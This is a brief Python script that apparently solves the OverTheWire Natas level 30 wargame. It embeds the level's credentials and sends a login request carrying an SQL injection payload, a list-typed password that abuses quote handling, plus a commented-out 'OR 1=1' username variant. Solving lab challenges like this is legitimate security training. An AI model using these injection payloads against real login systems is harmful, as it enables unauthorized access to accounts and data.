import requests

url = "http://natas30.natas.labs.overthewire.org"
auth = ("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")

session = requests.Session()
session.auth = auth

data = {
    "username": "admin",
    "password": ["'lol' or 1", 7]
}

# data = {
#     "username": ['admin" OR 1=1 -- ', 4],
#     "password": "lol"
# }

print(data, "\n\n\n\n")

response = session.post(url, data = data)

print(response.text)